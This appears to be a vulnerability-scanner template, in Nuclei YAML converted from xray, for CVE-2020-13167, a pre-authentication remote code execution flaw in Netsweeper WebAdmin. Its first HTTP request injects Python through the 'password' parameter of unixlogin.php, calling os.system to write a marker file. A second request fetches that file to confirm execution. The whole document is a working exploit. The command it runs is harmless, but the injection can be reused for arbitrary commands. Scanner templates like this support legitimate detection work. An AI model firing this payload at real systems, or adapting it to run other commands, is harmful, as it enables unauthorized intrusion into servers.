id: poc-yaml-netsweeper-webadmin-cve-2020-13167

info:
  name: poc-yaml-netsweeper-webadmin-cve-2020-13167
  author: 2husky
  severity: critical
  tags: xray-converted,cve-2020-13167,ct-108286
  reference:
    - https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/

http:
  - raw:
      - |
        GET /webadmin/tools/unixlogin.php?login=admin&password=g'%2C'')%3Bimport%20os%3Bos.system('echo%20{{rand_base(8)}}%20%3E%20log{{rand_int(1000, 9999)}}.txt')%23&timeout=5 HTTP/1.1
        Host: {{Hostname}}
        Referer: {{url}}/webadmin/admin/service_manager_data.php

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /webadmin/tools/log{{rand_int(1000, 9999)}}.txt HTTP/1.1
        Host: {{Hostname}}
        Referer: {{url}}/webadmin/admin/service_manager_data.php

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200